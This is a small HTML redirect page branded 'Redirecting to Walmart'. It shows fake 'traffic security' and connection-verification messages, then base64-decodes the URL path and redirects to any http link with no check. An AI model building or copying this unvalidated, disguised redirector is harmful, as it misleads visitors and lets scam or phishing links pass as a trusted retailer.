<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Redirecting to Walmart...</title><style>body{margin:0;height:100vh;display:flex;justify-content:center;align-items:center;font-family:Arial;background:#fff}.box{text-align:center;line-height:34px}.loader{width:42px;height:42px;border:4px solid #eee;border-top:4px solid #0071dc;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 15px}@keyframes spin{to{transform:rotate(360deg)}}</style></head><body><div class="box"><div class="loader"></div><div>🔒 Checking for traffic security...</div><div>🛡️ Verifying your connection...</div><div>🚀 Redirecting to Walmart...</div></div><script>
var code=location.pathname.split("/").pop().split("?")[0].trim();
if(code && code!=="r" && code!=="Skatecart"){
 try{
  var b64=code.replace(/-/g,'+').replace(/_/g,'/');
  while(b64.length%4)b64+='=';
  var link=atob(b64);
  if(link.startsWith("http")){
    setTimeout(function(){ location.replace(link); }, 1500);
  }
 }catch(e){}
}
</script></body></html>
